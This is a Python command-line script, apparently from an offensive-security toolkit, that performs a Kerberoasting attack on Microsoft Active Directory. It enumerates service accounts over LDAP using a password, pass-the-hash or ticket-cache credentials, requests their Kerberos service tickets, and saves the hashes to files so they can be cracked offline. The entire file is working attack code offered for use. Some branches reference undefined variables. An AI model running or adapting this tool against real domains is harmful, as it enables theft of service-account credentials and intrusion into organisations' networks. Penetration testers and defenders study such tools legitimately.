from msldap import *
from minikerberos import *
import ntpath
import logging
import getpass
import os


if __name__ == '__main__':
	import argparse

	parser = argparse.ArgumentParser(description='Tool to perform kerberoast attack against service users in MS Active Directory')
	parser.add_argument('target' , help='IP or Hostname of the DC')
	parser.add_argument('-o', '--outfile', help='Ouptut file base name, will create 2 files, userlist and hash list')
	parser.add_argument('-a', '--allhash', action='store_true', help='Store all hash regardless of enctype. (Hashcat only supports ETYPE 23 (RC4) )')
	parser.add_argument('-v', '--verbose', action='count', default=0, help='Increase verbosity, can be stacked')
	subparsers = parser.add_subparsers(help = 'commands')
	subparsers.required = True
	subparsers.dest = 'command'

	signle_group = subparsers.add_parser('single', help='Use one account for both LDAP and Kerberos comm (password or PTH)')
	signle_group.add_argument('-u', '--username', help='Username', required = True)
	signle_group.add_argument('-p', '--password', help='Password or NT hash, if not provided will be prompted for')
	signle_group.add_argument('-n', '--use-ntlm', help='use this if password is an NT hash')
	signle_group.add_argument('-d', '--domain'  , help='ldap user domain', required = True)
	signle_group.add_argument('-r', '--realm'  , help='Kerberos Realm of the domain you are trying to enumerate users in (eg. TEST.corp)', required = True)

	ccache_group = subparsers.add_parser('ccache', help='Use CCACHE file to pull TGT from')
	ccache_group.add_argument('-u', '--username', help='LDAP Username', required = True)
	ccache_group.add_argument('-p', '--password', help='LDAP Password or NT hash, if not provided will be prompted for')
	ccache_group.add_argument('-d', '--domain'  , help='LDAP Domain')
	ccache_group.add_argument('-n', '--use-ntlm', help='use this if password is an NT hash')
	ccache_group.add_argument('-c', '--ccache'  , help='CCACHE file to pull tickets from', required = True)
	ccache_group.add_argument('-r', '--realm'   , help='Kerberos Realm of the domain you are trying to enumerate users in (eg. TEST.corp)', required = True)

	multi_group = subparsers.add_parser('multi', help='Use one account for both LDAP and Kerberos comm')
	multi_group.add_argument('--ldap-username','--lu',  help='LDAP username', required = True)
	multi_group.add_argument('--ldap-domain','--ld',  help='LDAP user domain')
	multi_group.add_argument('--ldap-password','--lp',  help='LDAP password')
	multi_group.add_argument('--ldap-use-ntlm','--ln',  help='LDAP PTH')
	multi_group.add_argument('--kerberos-username','--ku',  help='Kerberos username', required = True)
	multi_group.add_argument('--kerberos-password','--kp',  help='Kerberos password')
	multi_group.add_argument('--kerberos-use-ntlm','--kn',  help='Kerberos PTH')
	multi_group.add_argument('--kerberos-aeskey','--kk',  help='Kerberos AES key')
	multi_group.add_argument('--kerberos-realm','--kr',  help='Kerberos Realm of the domain you are trying to enumerate users in (eg. TEST.corp)', required = True)

	args = parser.parse_args()

	if args.verbose == 0:
		logging.basicConfig(level=logging.INFO)
	elif args.verbose == 1:
		logging.basicConfig(level=logging.DEBUG)
	else:
		logging.basicConfig(level=1)

	ksoc = KerberosSocket(args.target)
	ldap_server = MSLDAPTargetServer(args.target)

	if args.command == 'ccache':
		if not args.password:
			password = getpass.getpass()
		#construct ldap stuff
		creds = MSLDAPUserCredential(username = args.username, domain = args.domain, password = password, is_ntlm=args.use_ntlm)
		target = MSLDAPTargetServer(args.target)
		ldap = MSLDAP(creds, target)

		ccache = CCACHE.from_file(args.ccache)

		#constructing file stuff
		basefile = None
		if args.outfile:
			basefolder = ntpath.dirname(args.outfile)
			basefile = ntpath.basename(args.outfile)

		#finally we can start working
		logging.info('Grabbing service users')
		ldap.connect()
		adinfo = ldap.get_ad_info()

		spn_users = []
		for user in ldap.get_all_service_user_objects():
			spn_users.append(user.sAMAccountName)

		logging.info('Found %d service users!' % len(spn_users))
		if basefile:
			with open(os.path.join(basefolder,basefile+'spn_users.txt'), 'w', newline='') as f:
				for user in spn_users:
					f.write(user+'\r\n')
		
		targets = []
		for user in spn_users:	
			target = TargetUser()
			target.username = user
			target.domain = args.realm #the kerberos realm
			targets.append(target)

		logging.info('Roasting...')
		hashes = []
		for tgt, key in ccache.get_all_tgt():
			try:
				logging.info('Trying to roast with %s' % '!'.join(tgt['cname']['name-string']))
				kcomm = KerbrosComm.from_tgt(ksoc, tgt, key)
				kr = Kerberoast(None, ksoc, kcomm = kcomm)
				hashes += kr.run(targets)

			except Exception as e:
				logging.debug('This ticket is not usable it seems Reason: %s' % e)
				continue
			else:
				break

		if basefile:
			with open(os.path.join(basefolder,basefile+'kerberoast.txt'), 'w', newline='') as f:
				for h in hashes:
					f.write(h+'\r\n')
		else:
			for h in hashes:
				print(h)

		logging.info('Done!')

	elif args.command == 'single':
		if not args.password:
			password = getpass.getpass()
		#construct ldap stuff
		creds = MSLDAPUserCredential(username = args.username, domain = args.domain if args.domain else args.realm, password = password, is_ntlm=args.use_ntlm)
		target = MSLDAPTargetServer(args.target)
		ldap = MSLDAP(creds, target)

		#constructing kerberos stuff
		ccred = User()
		ccred.username = args.username
		ccred.domain = args.realm
		if args.use_ntlm == True:
			ccred.NT = password
		else:
			ccred.password = password

		#constructing file stuff
		basefile = None
		if args.outfile:
			basefolder = ntpath.dirname(args.outfile)
			basefile = ntpath.basename(args.outfile)

		#finally we can start working
		logging.info('Grabbing service users')
		ldap.connect()
		adinfo = ldap.get_ad_info()

		spn_users = []
		for user in ldap.get_all_service_user_objects():
			spn_users.append(user.sAMAccountName)

		logging.info('Found %d service users!' % len(spn_users))
		if basefile:
			with open(os.path.join(basefolder,basefile+'spn_users.txt'), 'w', newline='') as f:
				for user in spn_users:
					f.write(user+'\r\n')
		
		targets = []
		for user in spn_users:	
			target = TargetUser()
			target.username = user
			target.domain = args.realm #the kerberos realm
			targets.append(target)

		logging.info('Roasting...')
		kr = Kerberoast(ccred, ksoc)
		hashes = kr.run(targets, allhash = args.allhash)

		if basefile:
			with open(os.path.join(basefolder,basefile+'kerberoast.txt'), 'w', newline='') as f:
				for h in hashes:
					f.write(h+'\r\n')
		else:
			for h in hashes:
				print(h)

		logging.info('Done!')

	elif args.command == 'multi':
		if not args.ldap_password:
			ldap_password = getpass.getpass('LDAP password: ')

		#construct ldap stuff
		creds = MSLDAPUserCredential(username = args.ldap_username, domain = args.ldap_domain, password = ldap_password, is_ntlm=args.ldap_use_ntlm)
		target = MSLDAPTargetServer(args.target)
		ldap = MSLDAP(creds, target)

		#constructing kerberos stuff
		ccred = User()
		ccred.username = args.kerberos_username
		ccred.domain = args.kerberos_realm
		kerberos_password = None
		if not args.kerberos_password and not args.kerberos_aeskey:
			kerberos_password = getpass.getpass('Kerberos password: ')
		
		if kerberos_password:
			if args.kerberos_use_ntlm == True:
				ccred.NT = kerberos_password
			else:
				ccred.password = kerberos_password

		else:
			kerberos_key_aes_128 = None
			kerberos_key_aes_256 = None
			if args.k:
				try:
					bytearray.fromhex(args.k)
				except Exception as e:
					raise Exception('AES key must be in hex format! %s' % e)
				
				if len(args.k) == 32:
					kerberos_key_aes_128 = args.k
				elif len(args.k) == 64:
					bytearray.fromhex(args.k)
					kerberos_key_aes_256 = args.k
				else:
					raise Exception('Wrong AES key size!')

			ccred.kerberos_key_aes_256 = kerberos_key_aes_256
			ccred.kerberos_key_aes_128 = kerberos_key_aes_128
			

		#constructing file stuff
		basefile = None
		if args.outfile:
			basefolder = ntpath.dirname(args.outfile)
			basefile = ntpath.basename(args.outfile)

		#finally we can start working
		logging.info('Grabbing service users')
		ldap.connect()
		adinfo = ldap.get_ad_info()

		spn_users = []
		for user in ldap.get_all_service_user_objects():
			spn_users.append(user.sAMAccountName)

		logging.info('Found %d service users!' % len(spn_users))
		if basefile:
			with open(os.path.join(basefolder,basefile+'spn_users.txt'), 'w', newline='') as f:
				for user in spn_users:
					f.write(user+'\r\n')
		
		targets = []
		for user in spn_users:	
			target = TargetUser()
			target.username = user
			target.domain = args.kerberos_realm #the kerberos realm
			targets.append(target)

		logging.info('Roasting...')
		kr = Kerberoast(ccred, ksoc)
		hashes = kr.run(targets, allhash = args.allhash)

		if basefile:
			with open(os.path.join(basefolder,basefile+'kerberoast.txt'), 'w', newline='') as f:
				for h in hashes:
					f.write(h+'\r\n')
		else:
			for h in hashes:
				print(h)

		logging.info('Done!')
			
		
